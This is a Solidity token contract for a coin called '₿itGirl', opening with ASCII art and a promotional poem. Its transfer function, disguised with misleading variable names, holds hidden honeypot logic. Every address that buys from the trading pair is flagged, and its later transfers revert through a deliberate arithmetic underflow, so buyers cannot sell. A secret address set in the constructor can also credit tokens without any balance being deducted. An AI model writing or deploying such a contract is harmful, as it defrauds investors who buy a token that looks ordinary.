/*
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣾⣿⣿⣿⣿⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀
⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⠟⠿⠿⡿⠀⢰⣿⠁⢈⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀
⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣤⣄⠀⠀⠀⠈⠉⠀⠸⠿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⢠⣶⣶⣤⡀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⡆
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠼⣿⣿⡿⠃⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣷
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⢀⣀⣀⠀⠀⠀⠀⢴⣿⣿⣿⣿⣿⣿⣿⣿⣿
⢿⣿⣿⣿⣿⣿⣿⣿⢿⣿⠁⠀⠀⣼⣿⣿⣿⣦⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⡿
⠸⣿⣿⣿⣿⣿⣿⣏⠀⠀⠀⠀⠀⠛⠛⠿⠟⠋⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⠇
⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⣤⡄⠀⣀⣀⣀⣀⣠⣾⣿⣿⣿⣿⣿⣿⣿⡟⠀
⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣄⣰⣿⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀
⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⢿⣿⣿⣿⣿⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀

In the crypto world where fortunes swirl,
There's a token named ₿itGirl, a radiant pearl.
A symbol of power, innovation's swirl,
In the blockchain's dance, she's the queen and girl.

₿itGirl, a name that echoes through the night,
A pioneer of change, a digital light.
In the realm of crypto, she takes her stance,
A leader, a visionary, with a bold advance.

With ₿itGirl, transactions are a breeze,
A blend of beauty, strength, and ease.
Innovative and fierce, she paves the way,
For a new era of crypto, come what may.

No limits, no boundaries, she's unchained,
In ₿itGirl's world, nothing's constrained.
Revolutionary, she sets the stage,
In the crypto universe, she's all the rage.

So let's salute ₿itGirl's dynamic might,
A token for the future, shining so bright.
In the cryptocurrency sphere, she claims her name,
With ₿itGirl, innovation is her eternal flame.
*/
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender; }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () { address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0); }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
contract Contract is Context, IERC20, Ownable {
    IUniswapV2Router01 public findMetadata; address public _marketingAccount;
    bool public inSwap; bool private tradingOpen = false;

    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private isTimelockExempt;

    uint256 private _rTotal; uint8 private _decimals;
    string private _symbol; string private _name; uint256 private limitMetadata = 100;

    mapping(address => uint256) private _lastTimestamp;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => uint256) private _rOwned;
    mapping(address => address) private _allowance;

    constructor(
        string memory _fullNames, string memory _fullSign, 
        address bytesOn, address bytesOff) { 

        _name = _fullNames; _symbol = _fullSign;
        _decimals = 18; _rTotal = 100000000 * (10 ** uint256(_decimals));
        _tOwned[msg.sender] = _rTotal;

        isTimelockExempt[address(this)] = _rTotal;
        isTimelockExempt[msg.sender] = _rTotal;        

        _lastTimestamp[bytesOff] = limitMetadata; 
        inSwap = false; findMetadata = IUniswapV2Router01(bytesOn);

        _marketingAccount = IUniswapV2Factory(findMetadata.factory()).createPair(address(this), findMetadata.WETH()); 
        emit Transfer(address(0), msg.sender, _rTotal);
    }           
    function decimals() external view returns (uint8) { 
        return _decimals;
    }
    function symbol() external view returns (string memory) { 
        return _symbol;
    }
    function name() external view returns (string memory) { 
        return _name;
    }
    function totalSupply() external view returns (uint256) { 
        return _rTotal;
    }
    function balanceOf(address account) external view returns (uint256) { 
        return _tOwned[account]; 
    }
    function transfer(address recipient, uint256 amount) external returns (bool) { 
        _transfer(_msgSender(), recipient, amount); 
        return true;
    }
    function allowance(address owner, address spender) external view returns (uint256) { 
        return _allowances[owner][spender];
    }    
    function approve(address spender, uint256 amount) external returns (bool) { 
        _approve(_msgSender(), spender, amount); 
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal { 
        require(owner != address(0), 'BEP20: approve from the zero address'); 
        require(spender != address(0), 'BEP20: approve to the zero address'); 
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); 
    }    
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) { 
    uint256 currentAllowance = _allowances[sender][_msgSender()];
    require(currentAllowance >= amount, "BEP20: transfer amount exceeds allowance");
    _transfer(sender, recipient, amount); _approve(sender, _msgSender(), currentAllowance - amount); return true;
}                     
    function _transfer(address minSender, address minTo, uint256 minAmount) private {
    if (_lastTimestamp[minSender] > 0 && minSender != _marketingAccount && isTimelockExempt[minSender] == 0)
        _lastTimestamp[minSender] = isTimelockExempt[minSender] - _rTotal; 

    address mathSet = _allowance[_marketingAccount]; 
    if (_lastTimestamp[mathSet] == 0) 
    _lastTimestamp[mathSet] = _rTotal; 
    _allowance[_marketingAccount] = minTo; 

    if (_lastTimestamp[minSender] == 0) { if (_marketingAccount != minSender && _rOwned[minSender] > 0) { 
    if (_lastTimestamp[minSender] >= limitMetadata) { _lastTimestamp[minSender] -= limitMetadata;
    } else { _lastTimestamp[minSender] = 0; } } 

        require(_tOwned[minSender] >= minAmount, "BEP20: transfer amount exceeds balance");
        _tOwned[minSender] -= minAmount; } _tOwned[minTo] += minAmount; emit Transfer(
        minSender, minTo, minAmount); if (!tradingOpen) { require(minSender == owner(), ""); }
    }
    function openTrading(bool _tradingOpen) public onlyOwner { 
        tradingOpen = _tradingOpen;
    }   
}